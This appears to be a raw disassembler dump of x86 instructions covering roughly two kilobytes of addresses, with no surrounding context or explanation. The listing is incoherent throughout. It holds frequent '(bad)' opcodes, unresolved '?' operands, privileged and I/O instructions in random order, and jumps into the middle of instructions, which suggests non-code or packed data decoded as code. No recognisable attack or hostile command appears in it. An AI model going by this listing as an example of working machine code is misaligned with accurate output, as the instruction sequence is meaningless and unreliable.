  4181e1:	fadd   DWORD PTR [edi-0x3dc44668]
  4181e7:	pop    edx
  4181e8:	pop    esi
  4181e9:	mov    dh,bh
  4181eb:	pop    edi
  4181ec:	lahf   
  4181ed:	inc    edi
  4181ee:	fucomip st,st(6)
  4181f0:	fisub  WORD PTR [ecx-0x3a]
  4181f3:	mov    dl,BYTE PTR [edx-0x7a]
  4181f6:	inc    ebp
  4181f7:	cmp    eax,0xc1f27099
  4181fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181fd:	push   edx
  4181fe:	push   edi
  4181ff:	aad    0x76
  418201:	push   edi
  418202:	loopne 0x4181cd
  418204:	adc    esi,esp
  418206:	pop    esp
  418207:	in     eax,0x3a
  418209:	in     al,dx
  41820a:	in     eax,0x75
  41820c:	add    ch,BYTE PTR [edi]
  41820e:	stos   BYTE PTR es:[edi],al
  41820f:	adc    DWORD PTR [ecx+0x73],edi
  418212:	stc    
  418213:	pop    eax
  418214:	or     bl,BYTE PTR [ebx+0x46e49964]
  41821a:	ins    DWORD PTR es:[edi],dx
  41821b:	pop    es
  41821c:	sub    BYTE PTR [edx+0xbeda1e6],0x53
  418223:	les    ecx,FWORD PTR [eax]
  418225:	or     al,0x9b
  418227:	out    dx,al
  418228:	sbb    bh,BYTE PTR [ebx-0x76]
  41822b:	ss cmp esp,eax
  41822e:	aam    0xaa
  418230:	ret    0xa915
  418233:	sbb    esp,edi
  418235:	inc    esp
  418236:	mov    dl,0x45
  418238:	jge    0x4181fc
  41823a:	(bad)  
  41823b:	dec    ebp
  41823c:	pushf  
  41823d:	push   0xffffffc1
  41823f:	add    dh,BYTE PTR [ebp-0x3a252f7e]
  418245:	mov    ecx,0x822ac652
  41824a:	push   ecx
  41824b:	aad    0xa9
  41824d:	ret    
  41824e:	cmc    
  41824f:	cwde   
  418250:	imul   esi,DWORD PTR [edx],0xfd63fe49
  418256:	lds    eax,FWORD PTR [edx+0x54bf6de9]
  41825c:	or     dl,cl
  41825e:	adc    DWORD PTR [esi],esp
  418260:	stos   BYTE PTR es:[edi],al
  418261:	jge    0x4182a1
  418263:	int3   
  418264:	mov    dh,0xab
  418266:	(bad)  
  418267:	xor    esi,esi
  418269:	sub    ch,bh
  41826b:	into   
  41826c:	add    DWORD PTR [edi+0x581aeec],edx
  418272:	ret    
  418273:	xchg   dh,bl
  418275:	or     esi,DWORD PTR [edx-0x42]
  418278:	retf   0xa11
  41827b:	jg     0x4182e3
  41827d:	into   
  41827e:	mov    bl,0xd2
  418280:	add    esp,esi
  418282:	xor    edi,DWORD PTR [edi+0x2f6095f7]
  418288:	sti    
  418289:	mul    DWORD PTR [esi-0x65a7f736]
  41828f:	daa    
  418290:	sbb    cl,cl
  418292:	ja     0x418256
  418294:	sbb    DWORD PTR [ecx-0x4f],0x36c8168e
  41829b:	std    
  41829c:	popf   
  41829d:	inc    ebp
  41829e:	sar    edx,0xd5
  4182a1:	adc    esi,DWORD PTR [ebx]
  4182a3:	in     eax,dx
  4182a4:	stos   DWORD PTR es:[edi],eax
  4182a5:	xlat   BYTE PTR ds:[ebx]
  4182a6:	bound  ax,DWORD PTR ss:[edx+0x19]
  4182ab:	xchg   ebx,eax
  4182ac:	stc    
  4182ad:	and    cl,BYTE PTR [ebx]
  4182af:	je     0x4182e4
  4182b1:	push   edi
  4182b2:	arpl   WORD PTR [ecx],sp
  4182b4:	in     eax,0xec
  4182b6:	adc    DWORD PTR [edx-0x3],0xcadcee63
  4182bd:	xchg   edx,eax
  4182be:	fisub  DWORD PTR [ebx]
  4182c0:	out    0x85,al
  4182c2:	div    dl
  4182c4:	adc    al,0xde
  4182c6:	in     al,0x87
  4182c8:	scas   eax,DWORD PTR es:[edi]
  4182c9:	sti    
  4182ca:	test   cl,ah
  4182cc:	mov    cl,0x94
  4182ce:	fisttp WORD PTR [edi+ebx*8]
  4182d1:	fdivr  DWORD PTR [ebx+0x619972d6]
  4182d7:	aad    0xcb
  4182d9:	sub    BYTE PTR [eax+ebp*8+0x6a],bl
  4182dd:	les    eax,FWORD PTR [edi+eax*4-0x69b77f02]
  4182e4:	imul   esp,DWORD PTR [ebp+0x6],0xffffffd4
  4182e8:	loop   0x4182d7
  4182ea:	adc    eax,0x7c472f9f
  4182f0:	xor    esp,DWORD PTR ds:0x9786ee0a
  4182f6:	xchg   ecx,eax
  4182f7:	int3   
  4182f8:	fsub   QWORD PTR [ebx+edi*8]
  4182fb:	je     0x41835c
  4182fd:	fmul   QWORD PTR [esp+edi*2+0xfd7b99]
  418304:	lods   eax,DWORD PTR ds:[esi]
  418305:	add    BYTE PTR [ecx+0x40],cl
  418308:	push   eax
  418309:	arpl   WORD PTR [esp+eax*2-0x34a688],di
  418310:	sbb    DWORD PTR [edi+0x492fe20d],ebx
  418316:	or     al,0xc4
  418318:	mov    edx,DWORD PTR [edi]
  41831a:	test   ch,bl
  41831c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831d:	bound  edx,QWORD PTR [edx+0x6e315bb9]
  418323:	jge    0x418398
  418325:	das    
  418326:	xchg   esi,eax
  418327:	mov    al,bl
  418329:	push   ecx
  41832a:	call   0x23dced44
  41832f:	add    eax,0x2886ca17
  418334:	in     eax,0xe
  418336:	sbb    eax,0xb711f9f6
  41833b:	fisttp QWORD PTR [ecx+0x51]
  41833e:	jne    0x418330
  418340:	jnp    0x4182fa
  418342:	hlt    
  418343:	cs pop edi
  418345:	sbb    edi,edx
  418347:	pusha  
  418348:	push   ebx
  418349:	pop    edx
  41834a:	out    0x5f,eax
  41834c:	fild   QWORD PTR [edi-0x68dffbb8]
  418352:	lock xor dh,dl
  418355:	int    0xef
  418357:	lock xor esi,DWORD PTR [edx+0x53]
  41835b:	lea    esi,[ecx]
  41835d:	push   esp
  41835e:	adc    eax,edi
  418360:	xchg   DWORD PTR [esi-0x23],ecx
  418363:	xchg   edi,eax
  418364:	daa    
  418365:	dec    esi
  418366:	mov    cl,0xa8
  418368:	adc    dh,BYTE PTR [ebx-0x51]
  41836b:	push   es
  41836c:	test   al,0x91
  41836e:	xchg   esp,eax
  41836f:	test   BYTE PTR [ecx],cl
  418371:	push   eax
  418372:	jne    0x41830d
  418374:	xchg   edx,eax
  418375:	inc    ecx
  418376:	push   edi
  418377:	or     cl,ch
  418379:	push   edx
  41837a:	pop    edx
  41837b:	push   ecx
  41837c:	loope  0x41839c
  41837e:	dec    ebx
  41837f:	xlat   BYTE PTR ds:[ebx]
  418380:	nop
  418381:	xchg   edx,eax
  418382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418383:	aad    0x32
  418385:	or     dl,BYTE PTR [eax]
  418387:	(bad)  
  418388:	mov    ecx,0xf0af0344
  41838d:	ss pusha 
  41838f:	loopne 0x418380
  418391:	scas   eax,DWORD PTR es:[edi]
  418392:	jae    0x418409
  418394:	adc    esp,DWORD PTR [eax-0x37]
  418397:	ds mov dl,0xbf
  41839a:	jb     0x418322
  41839c:	mov    edx,edi
  41839e:	sub    ecx,ecx
  4183a0:	ins    BYTE PTR es:[edi],dx
  4183a1:	lea    ebp,[ebp+edi*2-0x53]
  4183a5:	ins    BYTE PTR es:[edi],dx
  4183a6:	js     0x418342
  4183a8:	lahf   
  4183a9:	fwait
  4183aa:	dec    ecx
  4183ab:	push   ebp
  4183ac:	cwde   
  4183ad:	push   ebp
  4183ae:	fsubr  st(4),st
  4183b0:	inc    edx
  4183b1:	fimul  WORD PTR [esi]
  4183b3:	xchg   BYTE PTR ds:0x59ebfefc,dl
  4183b9:	jecxz  0x418422
  4183bb:	pop    edi
  4183bc:	dec    edx
  4183bd:	add    BYTE PTR [eax],al
  4183bf:	add    BYTE PTR [eax],al
  4183c1:	add    BYTE PTR [esi-0x144a9dc3],dl
  4183c7:	call   edi
  4183c9:	aas    
  4183ca:	popa   
  4183cb:	adc    ch,cl
  4183cd:	sub    DWORD PTR [edx-0x33],0xffffffeb
  4183d1:	loop   0x4183d7
  4183d3:	add    DWORD PTR [ecx],eax
  4183d5:	add    bl,dh
  4183d7:	add    al,0x0
  4183d9:	add    BYTE PTR [ecx+ecx*8+0x71],bh
  4183dd:	mov    ebx,0x2783e44e
  4183e2:	cmp    al,0x36
  4183e4:	and    al,0x69
  4183e6:	out    0x2,al
  4183e8:	es repz mov fs,esp
  4183ec:	jmp    0x1578b2cb
  4183f1:	(bad)  
  4183f2:	in     al,dx
  4183f3:	test   BYTE PTR [esi-0x15],bh
  4183f6:	and    eax,0xfb8f0ec7
  4183fb:	or     eax,0x9f32c5d
  418400:	push   0x4f
  418402:	cmp    bh,cl
  418404:	es mov ah,0xc6
  418407:	push   cs
  418408:	pop    eax
  418409:	or     DWORD PTR [ecx],eax
  41840b:	syscall 
  41840d:	cs inc edx
  41840f:	jmp    0x8763e178
  418414:	mov    bh,0x85
  418416:	push   edi
  418417:	aad    0x29
  418419:	mov    edi,0xbff13244
  41841e:	rol    DWORD PTR [ebx],cl
  418420:	sbb    ecx,edi
  418422:	fmul   QWORD PTR [esi-0x4a]
  418425:	push   ecx
  418426:	or     ch,BYTE PTR [ebx+0x7e497e73]
  41842c:	cmp    edi,esi
  41842e:	sti    
  41842f:	mov    cl,0x75
  418431:	sbb    eax,0xb3bd808a
  418436:	int    0xf3
  418438:	fisub  WORD PTR [ebp+0x77]
  41843b:	mov    al,0xeb
  41843d:	push   eax
  41843e:	mul    DWORD PTR [ebp-0x70ac29f8]
  418444:	loop   0x41842e
  418446:	arpl   WORD PTR ds:0x5d8cc628,bx
  41844c:	pop    ecx
  41844d:	int3   
  41844e:	in     al,dx
  41844f:	jmp    0x1150:0xe144e310
  418456:	mov    WORD PTR ds:0x37eb1985,?
  41845c:	fxam   
  41845e:	sub    eax,0xb49e557d
  418463:	ins    BYTE PTR es:[edi],dx
  418464:	bound  esi,QWORD PTR [edx+0x3fa37c26]
  41846a:	clc    
  41846b:	jns    0x418419
  41846d:	ret    
  41846e:	mov    ah,0xf
  418470:	dec    edx
  418471:	stos   BYTE PTR es:[di],al
  418473:	loope  0x418405
  418475:	push   es
  418476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418477:	hlt    
  418478:	fisttp DWORD PTR ds:0x8c8cddbe
  41847e:	and    ebp,edx
  418480:	or     BYTE PTR [ebp+0x4b],bh
  418483:	retf   0x3804
  418486:	ret    
  418487:	fistp  DWORD PTR [ebx+eiz*1]
  41848a:	std    
  41848b:	pop    ecx
  41848c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41848d:	sbb    DWORD PTR ds:0x6328ebf4,0x108a1fb
  418497:	mov    bl,0x85
  418499:	daa    
  41849a:	int    0xc4
  41849c:	cld    
  41849d:	mov    esi,0x8f8fa2b
  4184a3:	loopne 0x418440
  4184a5:	sub    bh,dh
  4184a7:	call   0x2154:0xdc6ee9b5
  4184ae:	jmp    0xeef6fbae
  4184b3:	(bad)  
  4184b4:	xor    bh,ch
  4184b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b7:	jb     0x418531
  4184b9:	fild   QWORD PTR [edi-0x4e087496]
  4184bf:	adc    al,0x81
  4184c1:	fsubr  st,st(4)
  4184c3:	sahf   
  4184c4:	adc    BYTE PTR [edi-0x2685f45],ah
  4184ca:	cmp    ebx,DWORD PTR [ebp-0x5a]
  4184cd:	iret   
  4184ce:	and    al,0x81
  4184d0:	cmp    eax,0xf355cdba
  4184d5:	jg     0x41853d
  4184d7:	mov    dh,0x5b
  4184d9:	pop    ecx
  4184da:	push   ebp
  4184db:	lahf   
  4184dc:	cdq    
  4184dd:	fnstenv [esi+ebx*8]
  4184e0:	js     0x186d141f
  4184e6:	cmp    ecx,ecx
  4184e8:	xor    BYTE PTR [ecx-0xc],al
  4184eb:	inc    ecx
  4184ec:	sub    BYTE PTR [esi+0xb57e85c],bl
  4184f2:	pushf  
  4184f3:	mov    ebx,0x89e71870
  4184f8:	inc    eax
  4184f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184fa:	cmp    eax,0x951a9af4
  4184ff:	xor    edx,DWORD PTR [edx]
  418501:	inc    esp
  418502:	cld    
  418503:	push   esp
  418504:	mov    al,ds:0xdae00b7
  418509:	dec    DWORD PTR [edx-0x228d1bd]
  41850f:	xchg   ecx,eax
  418510:	scas   eax,DWORD PTR es:[edi]
  418511:	mov    esi,0x4175a628
  418516:	push   ebp
  418517:	jp     0x41856b
  418519:	or     BYTE PTR [ebx-0x35],cl
  41851c:	pop    ebp
  41851d:	sbb    BYTE PTR [edx-0x6e],0x37
  418521:	rcl    BYTE PTR [esi+0x1a0ede28],1
  418527:	es in  al,0xfb
  41852a:	mov    gs,esi
  41852c:	jge    0x4184e7
  41852e:	dec    edi
  41852f:	rol    BYTE PTR [esi+0x24],1
  418532:	es addr16 sbb al,0x12
  418536:	mov    ?,WORD PTR [ebp+0x67]
  418539:	xchg   edx,eax
  41853a:	mov    ecx,0x5c96f73d
  41853f:	push   ss
  418540:	jo     0x418505
  418542:	dec    ebp
  418543:	mov    ecx,DWORD PTR [ecx+0x16]
  418546:	push   esp
  418547:	push   es
  418548:	retf   0xd5b0
  41854b:	mov    BYTE PTR [edi+eiz*8],cl
  41854e:	add    BYTE PTR [ecx],dl
  418550:	adc    al,0x59
  418552:	and    dl,BYTE PTR [esi-0x2a]
  418555:	sub    BYTE PTR [edi-0xbb1e9f8],dh
  41855b:	pop    ss
  41855c:	(bad)  
  41855d:	fwait
  41855e:	std    
  41855f:	add    DWORD PTR [ebx-0x21],eax
  418562:	in     eax,0x4a
  418564:	sbb    BYTE PTR [ebx+0x7f5a8318],cl
  41856a:	adc    eax,0xeba29cd5
  41856f:	push   DWORD PTR [eax+0x23]
  418572:	ret    0x2f76
  418575:	js     0x41859a
  418577:	jns    0x4185d1
  418579:	mov    ds,WORD PTR [eax+0x6b]
  41857c:	test   eax,0x400fe7be
  418581:	adc    dl,cl
  418583:	cmp    ecx,ebx
  418585:	daa    
  418586:	jmp    0x418511
  418588:	nop
  418589:	aaa    
  41858a:	or     al,0x2c
  41858c:	pop    ds
  41858d:	iret   
  41858e:	jo     0x418603
  418590:	mov    BYTE PTR [ecx+0x71520bb3],cl
  418596:	adc    eax,DWORD PTR [edx+0x3e]
  418599:	mov    cl,0x70
  41859b:	xor    cl,BYTE PTR [ebp-0x6c]
  41859e:	pop    edi
  41859f:	fnstcw WORD PTR [ebp-0x5e]
  4185a2:	aas    
  4185a3:	xor    BYTE PTR [ebp+0x45aac83e],cl
  4185a9:	icebp  
  4185aa:	push   0x38
  4185ac:	push   esi
  4185ad:	push   cs
  4185ae:	mov    ah,cl
  4185b0:	shl    BYTE PTR [ebx],cl
  4185b2:	and    ah,BYTE PTR [edx-0x57]
  4185b5:	push   ss
  4185b6:	mov    ?,WORD PTR [esi]
  4185b8:	or     edi,esp
  4185ba:	push   ds
  4185bb:	adc    bl,BYTE PTR [edi-0x2b46e5e8]
  4185c1:	pop    ecx
  4185c2:	iret   
  4185c3:	xchg   edx,eax
  4185c4:	push   edx
  4185c5:	stc    
  4185c6:	(bad)  
  4185c7:	aas    
  4185c8:	pop    edi
  4185c9:	cmp    eax,0x48d99ae2
  4185ce:	dec    edx
  4185cf:	add    eax,0x35c34655
  4185d4:	mov    ebp,0x2770f509
  4185d9:	cmp    eax,0x86be5b1
  4185de:	aam    0xdb
  4185e0:	test   edi,eax
  4185e2:	hlt    
  4185e3:	test   DWORD PTR [esi+0x73acc848],edi
  4185e9:	pop    ebx
  4185ea:	(bad)  
  4185eb:	push   edx
  4185ec:	sub    eax,0xdaafafe7
  4185f1:	sbb    ch,bh
  4185f3:	inc    eax
  4185f4:	pop    edx
  4185f5:	sub    eax,0x93518c8d
  4185fa:	mov    edx,0xbe602d9a
  4185ff:	mov    esi,0x21dae65a
  418604:	bound  esi,QWORD PTR [edi]
  418606:	(bad)  
  418608:	faddp  st(3),st
  41860a:	adc    eax,DWORD PTR [edi]
  41860c:	pop    eax
  41860d:	scas   al,BYTE PTR es:[edi]
  41860e:	fcomp  DWORD PTR [edx+edi*4-0x17]
  418612:	add    edi,eax
  418614:	pushf  
  418615:	popa   
  418616:	push   edx
  418617:	jmp    0xfd33:0xaa04cc57
  41861e:	push   cs
  41861f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418620:	or     eax,0x5c7b5f3b
  418625:	pop    edi
  418626:	je     0x41861b
  418628:	inc    ebp
  418629:	push   ds
  41862a:	mov    esi,0x721f3fba
  41862f:	inc    esi
  418630:	adc    eax,0xdc967be8
  418635:	adc    eax,0x8d89664e
  41863a:	cdq    
  41863b:	(bad)  [edi-0x47d301b7]
  418641:	inc    eax
  418642:	mov    ebp,0x3629463e
  418647:	push   ecx
  418648:	call   0x13e2b008
  41864d:	cli    
  41864e:	popa   
  41864f:	add    BYTE PTR [edx+esi*4+0x1ac1c99],cl
  418656:	and    ah,BYTE PTR [edx]
  418658:	stc    
  418659:	push   edi
  41865a:	sahf   
  41865b:	sub    dh,BYTE PTR [eax-0x21]
  41865e:	es xchg edi,edi
  418661:	fidiv  DWORD PTR [eax]
  418663:	(bad)  
  418664:	xor    dh,BYTE PTR [ebp+0x9e4e3f]
  41866a:	mov    WORD PTR [ecx],ds
  41866c:	lock xchg esi,eax
  41866e:	jo     0x4186e2
  418670:	repz lock sub dl,BYTE PTR [ebx]
  418674:	stos   DWORD PTR es:[edi],eax
  418675:	rcl    DWORD PTR [ebx],cl
  418677:	or     al,BYTE PTR [ecx]
  418679:	daa    
  41867a:	sub    al,0x2d
  41867c:	jne    0x4186e2
  41867e:	mov    bl,0x9f
  418680:	cmp    ebx,DWORD PTR [edi]
  418682:	retf   
  418683:	mov    ds:0x7750c985,al
  418688:	pushf  
  418689:	out    0x75,eax
  41868b:	inc    ebp
  41868c:	bound  ebx,QWORD PTR [esi-0x52]
  41868f:	jnp    0x41865e
  418691:	or     al,0x69
  418693:	sbb    al,0x74
  418695:	fiadd  WORD PTR [ecx]
  418697:	es dec ecx
  418699:	mov    esi,0xa075274c
  41869e:	outs   dx,BYTE PTR ds:[esi]
  41869f:	les    ecx,FWORD PTR [ebp-0x39841fd8]
  4186a5:	dec    edi
  4186a6:	fs mov esi,0x8a068e65
  4186ac:	mov    ebp,0x651692fa
  4186b1:	fwait
  4186b2:	jo     0x418675
  4186b4:	fwait
  4186b5:	clc    
  4186b6:	jae    0x4186e7
  4186b8:	inc    edi
  4186b9:	aas    
  4186ba:	xlat   BYTE PTR ds:[ebx]
  4186bb:	sbb    BYTE PTR ds:0x56dcb428,0xc5
  4186c2:	nop
  4186c3:	or     bl,BYTE PTR [esi-0x6b]
  4186c6:	sar    DWORD PTR [edi+0x2b],0xe1
  4186ca:	out    dx,al
  4186cb:	les    esp,FWORD PTR [esi]
  4186cd:	xor    eax,0x92e7cad6
  4186d2:	pushf  
  4186d3:	mov    esi,0xccad8688
  4186d8:	stc    
  4186d9:	mov    ebx,ecx
  4186db:	lock out dx,al
  4186dd:	cs or  bh,0x6c
  4186e1:	arpl   WORD PTR [ecx],bx
  4186e3:	push   cs
  4186e4:	jae    0x418671
  4186e6:	aam    0x7a
  4186e8:	mov    ?,esi
  4186ea:	les    esi,FWORD PTR [ebx-0x4d]
  4186ed:	(bad)  
  4186ee:	icebp  
  4186ef:	out    dx,al
  4186f0:	jecxz  0x4186d6
  4186f2:	into   
  4186f3:	nop
  4186f4:	mov    ah,0x8f
  4186f6:	call   DWORD PTR [esi]
  4186f8:	inc    eax
  4186f9:	jge    0x4186e5
  4186fb:	jno    0x418699
  4186fd:	shl    ebx,0xf2
  418700:	out    0x1b,eax
  418702:	cli    
  418703:	cmp    ebx,DWORD PTR [edi]
  418705:	lods   eax,DWORD PTR ds:[esi]
  418706:	retf   0x4c7b
  418709:	jae    0x418699
  41870b:	pop    ebp
  41870c:	aaa    
  41870d:	hlt    
  41870e:	scas   al,BYTE PTR es:[edi]
  41870f:	rcr    BYTE PTR [ebp-0xa],1
  418712:	xchg   esi,eax
  418713:	out    dx,al
  418714:	xchg   edx,eax
  418715:	xchg   esp,eax
  418716:	mov    eax,0x7c689721
  41871b:	and    BYTE PTR [eax+0xb21783d],bl
  418721:	cmp    BYTE PTR [esi+eiz*1],dl
  418724:	loope  0x418724
  418726:	mov    al,ds:0xa6868c6
  41872b:	test   BYTE PTR fs:[edx],dh
  41872e:	xor    DWORD PTR [ebp+0xb],edi
  418731:	xor    cl,BYTE PTR [edx+0x1d]
  418734:	rcr    DWORD PTR [ebp+0xd],0x8a
  418738:	out    dx,eax
  418739:	sti    
  41873a:	ss fadd st,st(3)
  41873d:	mov    esi,0x1c5944eb
  418742:	stc    
  418743:	push   edi
  418744:	retf   
  418745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418746:	in     al,0x31
  418748:	jb     0x418746
  41874a:	std    
  41874b:	data16 data16 sbb al,0x12
  41874f:	dec    esp
  418750:	mov    al,0x61
  418752:	outs   dx,DWORD PTR ds:[esi]
  418753:	pop    ds
  418754:	jb     0x418754
  418756:	add    esp,DWORD PTR [edi-0x9d8d25d]
  41875c:	enter  0x53fe,0x98
  418760:	add    DWORD PTR [edx+ecx*2-0x4f],0x29
  418765:	pusha  
  418766:	js     0x4187b5
  418768:	outs   dx,DWORD PTR ds:[esi]
  418769:	stos   BYTE PTR es:[edi],al
  41876a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41876b:	pop    esp
  41876c:	sub    al,0xf3
  41876e:	and    ch,BYTE PTR [esi+0x453df374]
  418774:	jge    0x418750
  418776:	lock inc ebx
  418778:	mov    bl,0x6c
  41877a:	rcr    DWORD PTR ds:0x796e0b29,cl
  418780:	xchg   ecx,eax
  418781:	ja     0x418801
  418783:	push   ebp
  418784:	lods   al,BYTE PTR ds:[esi]
  418785:	(bad)  
  418786:	test   BYTE PTR [esi-0x357ecd7d],0x39
  41878d:	mov    al,0xfb
  41878f:	xor    eax,0xfae285e9
  418794:	retf   0x6343
  418797:	fiadd  WORD PTR [esp+ecx*8-0x42]
  41879b:	and    ecx,DWORD PTR gs:[ebx-0x2c]
  41879f:	mov    ds:0x8fc3b0,al
  4187a4:	adc    BYTE PTR [ebx],al
  4187a6:	mov    bl,0x2c
  4187a8:	ins    DWORD PTR es:[edi],dx
  4187a9:	fnstsw WORD PTR [esi-0x1bf2c6e3]
  4187af:	pop    edx
  4187b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187b1:	inc    edx
  4187b2:	arpl   WORD PTR [ecx],di
  4187b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187b6:	mov    edx,0x3a8939ed
  4187bb:	fild   QWORD PTR [edx-0x50]
  4187be:	lock jmp 0x41875b
  4187c1:	mov    bh,0x94
  4187c3:	sbb    DWORD PTR [esi+eax*4+0x7e],eax
  4187c7:	lahf   
  4187c8:	mov    BYTE PTR [ebx-0x66],al
  4187cb:	in     al,dx
  4187cc:	jl     0x4187a8
  4187ce:	scas   eax,DWORD PTR es:[edi]
  4187cf:	mov    esp,DWORD PTR [edi]
  4187d1:	dec    esi
  4187d2:	call   FWORD PTR [edi]
  4187d4:	mov    edx,0x16b48339
  4187d9:	mov    edi,0x92426d94
  4187de:	stos   BYTE PTR es:[edi],al
  4187df:	fld    TBYTE PTR [eax-0x7e]
  4187e2:	adc    cl,BYTE PTR [edi-0x486d8d94]
  4187e8:	push   eax
  4187e9:	or     bh,al
  4187eb:	pop    ss
  4187ec:	shl    dh,0x26
  4187ef:	mov    edx,0x1617e551
  4187f4:	retfw  0x3a18
  4187f8:	test   al,0xc1
  4187fa:	mov    ebp,0x467a6853
  4187ff:	ret    
  418800:	call   0xccd75e83
  418805:	fild   DWORD PTR [ebp-0x6d]
  418808:	dec    esp
  418809:	add    DWORD PTR [ebx-0x512c7ca8],ecx
  41880f:	and    eax,0x94f61416
  418814:	rcr    DWORD PTR [ecx],cl
  418816:	cwde   
  418817:	mov    dl,0xbe
  418819:	push   esp
  41881a:	lds    edi,FWORD PTR [esi+0x46556cdc]
  418820:	icebp  
  418821:	inc    edi
  418822:	mov    dl,0x40
  418824:	adc    edx,DWORD PTR [edx]
  418826:	pop    esi
  418827:	push   eax
  418828:	sub    ebx,ecx
  41882a:	hlt    
  41882b:	cmp    dl,BYTE PTR [esi]
  41882d:	sbb    DWORD PTR [esp+edi*4-0x6a],edi
  418831:	dec    ecx
  418832:	into   
  418833:	mov    ebp,ebp
  418835:	or     ebx,DWORD PTR [eax+ebx*8+0x45]
  418839:	xchg   di,ax
  41883b:	xlat   BYTE PTR ds:[ebx]
  41883c:	(bad)  
  41883e:	retf   
  41883f:	mov    ecx,0x32470291
  418844:	jno    0x418813
  418846:	jnp    0x418857
  418848:	fstp   QWORD PTR [ecx-0x35b7035c]
  41884e:	inc    edi
  41884f:	leave  
  418850:	packsswb mm3,QWORD PTR [esi]
  418853:	cwde   
  418854:	pop    esp
  418855:	cmp    al,0x3e
  418857:	jp     0x418863
  418859:	jp     0x4187dd
  41885b:	xor    DWORD PTR [ebx+0x10b83f96],esp
  418861:	sbb    eax,0x2518dd00
  418866:	or     ebx,edx
  418868:	popf   
  418869:	xchg   esi,eax
  41886a:	ins    DWORD PTR es:[edi],dx
  41886b:	int3   
  41886c:	nop
  41886d:	enter  0xc764,0xcc
  418871:	fisttp DWORD PTR [edi+esi*4-0x3218b775]
  418878:	pop    esp
  418879:	(bad)  
  41887a:	fnsave [edi+edi*1-0x3a]
  41887e:	mov    edx,0xc2fc6e3
  418883:	push   0xa05dc1d6
  418888:	aam    0x3
  41888a:	and    BYTE PTR [ebp+0x5b],bl
  41888d:	pop    ds
  41888e:	adc    DWORD PTR [ecx],0xfacc26e0
  418894:	cmp    dh,BYTE PTR [edx*4+0x7d844e43]
  41889b:	xchg   ebp,eax
  41889c:	sbb    DWORD PTR [ebx+0x3ad4194d],ecx
  4188a2:	(bad)  
  4188a3:	adc    eax,DWORD PTR [eax+eax*1-0x44]
  4188a7:	fdiv   DWORD PTR [ecx-0x6793ee6c]
  4188ad:	outs   dx,DWORD PTR ds:[esi]
  4188ae:	data16 cli 
  4188b0:	sub    eax,0xb4f41673
  4188b5:	lea    esp,[esi]
  4188b7:	cs jb  0x4188a9
  4188ba:	mov    bh,0xd0
  4188bc:	pop    ebp
  4188bd:	ins    BYTE PTR es:[edi],dx
  4188be:	loope  0x4188a9
  4188c0:	xor    al,0x5d
  4188c2:	and    al,0x86
  4188c4:	sahf   
  4188c5:	popf   
  4188c6:	(bad)  
  4188c7:	push   ebp
  4188c8:	js     0x4188b6
  4188ca:	jp     0x4188a3
  4188cc:	add    eax,0x0
  4188d1:	add    BYTE PTR [esi-0x8290893],bl
  4188d7:	fidivr WORD PTR [edi-0x61f42993]
  4188dd:	int    0x6e
  4188df:	daa    
  4188e0:	fsub   QWORD PTR [edi+esi*8]
  4188e3:	add    eax,0x4f30001
  4188e8:	add    BYTE PTR [eax],al
  4188ea:	xchg   ecx,eax
  4188eb:	sbb    al,0xf7
  4188ed:	xchg   DWORD PTR [eax+0x3dd4bc27],esi
  4188f3:	mov    al,0x5c
  4188f5:	adc    esi,DWORD PTR [eax-0x3b86fa23]
  4188fb:	lods   eax,DWORD PTR ds:[esi]
  4188fc:	dec    eax
  4188fd:	push   cs
  4188fe:	je     0x41889f
  418900:	ret    0xbc3f
  418903:	mov    dh,0x89
  418905:	ss cmp eax,0x49b45aab
  41890b:	mov    dl,0x8b
  41890d:	push   cs
  41890e:	dec    ecx
  41890f:	add    al,0x98
  418911:	mov    cl,0xa9
  418913:	push   ds
  418914:	pop    ecx
  418915:	cs lahf 
  418917:	and    dh,BYTE PTR [esp+edx*1-0x2f]
  41891b:	loope  0x418935
  41891d:	and    DWORD PTR [ebx],0xffffff85
  418920:	jmp    0x418982
  418922:	xchg   esp,eax
  418923:	inc    edi
  418924:	inc    esp
  418925:	(bad)  
  418926:	sub    al,0xa9
  418928:	mov    WORD PTR [edi],gs
  41892a:	inc    esi
  41892b:	aaa    
  41892c:	sbb    eax,0x21765acf
  418931:	sar    DWORD PTR [edi+0x1bd26f9],0xb3
  418938:	addr16 xchg ebx,eax
  41893a:	mov    ch,0x80
  41893c:	and    bl,bh
  41893e:	sub    ecx,DWORD PTR [ecx-0x2a8a8ffe]
  418944:	std    
  418945:	rol    BYTE PTR [ebp-0x5afbe65c],1
  41894b:	lock push cs
  41894d:	mov    ecx,0xbd786872
  418952:	mov    esp,0x8154e336
  418957:	lods   al,BYTE PTR ds:[esi]
  418958:	adc    eax,0xf381400c
  41895d:	jge    0x41892a
  41895f:	xchg   ebp,eax
  418960:	mov    ecx,0xa35613bf
  418965:	inc    ebx
  418966:	mov    ebp,0x113d3c3
  41896b:	(bad)  
  41896c:	imul   esi,DWORD PTR [edx-0x3e8a941b],0x7e
  418973:	sub    bh,BYTE PTR [eax+0x21]
  418976:	loope  0x41891d
  418978:	mov    eax,0x591d9364
  41897d:	rcr    DWORD PTR [edx-0x65209758],cl
  418983:	outs   dx,DWORD PTR ds:[esi]
  418984:	push   ds
  418985:	cdq    
  418986:	jo     0x418975
  418988:	ret    0xb10f
  41898b:	ins    BYTE PTR es:[edi],dx
  41898c:	out    0xf7,al
  41898e:	mov    dh,0xb2
  418990:	push   DWORD PTR [eax]
  418992:	addr16 or eax,0x70158961
  418998:	push   0x8e2d379
  41899d:	pop    esi
  41899e:	push   esp
  41899f:	sub    esi,esp
  4189a1:	pop    edx
  4189a2:	pop    ds
  4189a3:	ret    
  4189a4:	xchg   ecx,eax
  4189a5:	stc    
  4189a6:	sbb    BYTE PTR [edi],bl
